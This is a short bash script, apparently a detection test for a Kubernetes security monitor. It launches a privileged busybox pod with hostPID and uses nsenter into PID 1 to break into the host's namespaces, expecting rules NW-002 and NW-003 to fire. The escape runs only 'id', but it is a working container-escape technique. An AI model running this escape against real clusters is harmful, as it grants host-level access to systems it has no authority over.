#!/usr/bin/env bash
# T1611 Escape to Host — nsenter from a privileged pod (NW-002/003).
set -euo pipefail
NS=${NS:-nightwatch-test}
kubectl -n "$NS" run escape-demo --restart=Never --image=busybox \
  --overrides='{"spec":{"containers":[{"name":"c","image":"busybox","command":["sleep","300"],"securityContext":{"privileged":true}}],"hostPID":true}}'
kubectl -n "$NS" wait --for=condition=Ready pod/escape-demo --timeout=60s
# trigger: spawn a shell, then attempt the namespace break-out (harmless: just runs id on the host ns)
kubectl -n "$NS" exec escape-demo -- sh -c 'nsenter -t 1 -m -u -i -n -p -- id || true'
echo "[+] expect NW-002 CRITICAL + NW-003 WARNING"
